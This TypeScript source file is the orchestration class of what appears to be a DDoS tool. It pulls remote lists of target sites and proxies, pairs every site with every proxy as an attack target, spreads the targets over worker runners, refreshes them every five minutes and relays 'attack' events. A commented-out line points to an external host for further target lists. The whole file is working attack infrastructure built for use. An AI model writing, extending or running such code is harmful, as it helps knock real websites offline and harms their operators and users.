import { AxiosError } from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'
import { DoserEventType, TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse, TargetDataAlternative } from './types'
import { Runner } from './runner'
import { getSites, getProxies } from './requests'

const CONFIGURATION_INVALIDATION_TIME = 300000

export class Doser {
  private onlyProxy: boolean
  private hosts: Array<string> = []
  private working: boolean
  private workers: Runner[] = []
  private numberOfWorkers = 0
  private eventSource: EventEmitter
  private ddosConfiguration: {
    updateTime: Date;
    sites: SiteData[];
    proxies: ProxyData[];
    targets: TargetDataAlternative[];
  } | null = null

  private verboseError: boolean;

  constructor(onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
    this.onlyProxy = onlyProxy
    this.working = false
    this.eventSource = new EventEmitter()
    this.verboseError = verboseError
    this.initialize(numberOfWorkers).catch(error => {
      console.error('Wasnt able to initialize:', error)
    })
  }

  private logError(message: string, cause: unknown) {
    console.log(message)

    if (this.verboseError) {
      console.log(cause)
    } else {
      console.log((cause as AxiosError)?.message)
    }
  }

  private async initialize(numberOfWorkers: number, attemptNumber = 1): Promise<void> {
    const config = await this.getSitesAndProxies()
    const targets: TargetDataAlternative[] = []
    if (!config) {
      console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
      return this.initialize(numberOfWorkers, attemptNumber + 1)
    }
    console.debug('Initialized doser', config)
    this.makeTargets(config, targets)
    this.updateConfiguration(config, targets)
    this.listenForConfigurationUpdates()
    return this.setWorkersCount(numberOfWorkers)
  }

  forceProxy(newVal: boolean) {
    this.onlyProxy = newVal
    try {
      this.workers.forEach((worker, i) => {
        worker.setProxyActive(newVal)
        console.debug(`Changing runner proxy value ${i}..`)
      })

    } catch (err) {
      console.log(err)
    }
  }

  async loadHostsFile() {
    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
    // this.hosts = response.data as Array<string>
  }


  private makeTargets(configuration: { sites: SiteData[]; proxies: ProxyData[] }, targets: TargetDataAlternative[]) {
    let targetsLocal: TargetDataAlternative[] = []
    for (let i = 0; i < configuration.sites.length; i++) {
      for (let j = 0; j < configuration.proxies.length; j++) {
        var newTarget = {
          site: configuration.sites[i],
          proxy: configuration.proxies[j],
          NeedAttack: true
        } as TargetDataAlternative
        targets.push(newTarget);
      }
    }
  }

  private updateConfiguration(configuration: { sites: SiteData[]; proxies: ProxyData[] }, targets: TargetDataAlternative[]) {
    this.ddosConfiguration = {
      ...configuration,
      updateTime: new Date(),
      targets: targets
    }
    this.workers.forEach(worker => {
      worker.updateConfiguration(targets)
    })
  }

  private listenForConfigurationUpdates(wasPreviousUpdateSuccessful = true) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      if (!this.ddosConfiguration) {
        return this.listenForConfigurationUpdates(false)
      }

      const config = await this.getSitesAndProxies()
      const targets: TargetDataAlternative[] = []
      if (!config) {
        console.debug('Wasnt able to get configuration updates')
        return this.listenForConfigurationUpdates(false)
      }
      this.makeTargets(config, targets)
      this.updateConfiguration(config, targets)
      this.listenForConfigurationUpdates(true)
    }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
  }

  async getSitesAndProxies(): Promise<GetSitesAndProxiesResponse> {
    while (this.working) { // escaping unavailable hosts
      try {
        const [proxies, sites] = await Promise.all([getProxies(), getSites()])

        if (proxies.status !== 200 || sites.status !== 200) continue
        return {
          sites: sites.data,
          proxies: proxies.data
        }
      } catch (e) {
        this.logError('Error while loading hosts', e)
      }
    }
    return null
  }

  async getRandomTarget(): Promise<TargetData | null> {
    while (this.working) { // escaping unavailable hosts
      try {
        const [proxies, sites] = await Promise.all([getProxies(), getSites()])

        if (proxies.status !== 200 || sites.status !== 200) continue

        return {
          site: sites.data[Math.floor(Math.random() * sites.data.length)],
          proxy: proxies.data
        }
      } catch (e) {
        this.logError('Error while loading hosts', e)
      }
    }
    return null
  }

  setWorkersCount(newCount: number) {
    /*if (this.ddosConfiguration != null) {
      let size = Math.floor(this.ddosConfiguration.targets.length / newCount)
      console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
      if (newCount < this.numberOfWorkers) {
        for (let i = this.numberOfWorkers; i >= newCount; i--) {
          this.workers[i]?.eventSource.removeAllListeners()
          this.workers[i]?.stop()
        }
        this.workers = this.workers.slice(0, newCount)
      } else {
        while (this.workers.length < newCount) {
          const newWorker = this.createNewWorker(0, this.ddosConfiguration.targets.length)
          this.workers.push(newWorker)
          if (this.working) {
            newWorker.start().catch(error => {
              console.debug('Wasnt able to start new runner:', error)
            })
          }
        }
      }
    }*/
    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
    if (newCount != this.workers.length) {
      this.workers.forEach(element => {
        element?.eventSource.removeAllListeners()
        element?.stop()
      });
      if (this.ddosConfiguration != null) {
        let size = Math.floor(this.ddosConfiguration.targets.length / newCount)
        for (let i = 0; i < newCount; i++) {
          if (i < newCount - 1) {
            const newWorker = this.createNewWorker(i*size,(i+1)*size)
            this.workers.push(newWorker)
            if (this.working) {
              newWorker.start().catch(error => {
                console.debug('Wasnt able to start new runner:', error)
              })
            }
          }else{
            const newWorker = this.createNewWorker(i*size,this.ddosConfiguration.targets.length)
            this.workers.push(newWorker)
            if (this.working) {
              newWorker.start().catch(error => {
                console.debug('Wasnt able to start new runner:', error)
              })
            }
          }
        }
      }
    }

    this.numberOfWorkers = newCount
  }

  start() {
    this.working = true
    this.workers.forEach((worker, i) => {
      console.debug(`Starting runner ${i}..`)
      worker.start().catch(error => {
        console.error(`Wasnt able to start worker #${i} - `, error)
      })
    })
  }

  stop() {
    this.working = false
    this.workers.forEach((worker, i) => {
      console.debug(`Stopping runner ${i}..`)
      worker.stop()
    })
  }

  private createNewWorker(startID: number, endID: number): Runner {
    console.debug('Creating new worker..')
    // Should never happen
    if (!this.ddosConfiguration) {
      throw new Error('Cannot create worker without configuration')
    }
    const worker = new Runner({
      //sites: this.ddosConfiguration.sites,
      //proxies: this.ddosConfiguration.proxies,
      targets: this.ddosConfiguration.targets,
      onlyProxy: this.onlyProxy,
      startID: startID,
      endID: endID
    })
    worker.eventSource.on('attack', event => {
      this.eventSource.emit('atack', {
        type: 'atack',
        ...event
      })
    })

    worker.eventSource.on('error', event => {
      if (this.verboseError) {
        this.eventSource.emit('error', event)
      }
    })
    return worker
  }

  listen(event: DoserEventType, callback: (data: any) => void) {
    this.eventSource.addListener(event, callback)
  }
}
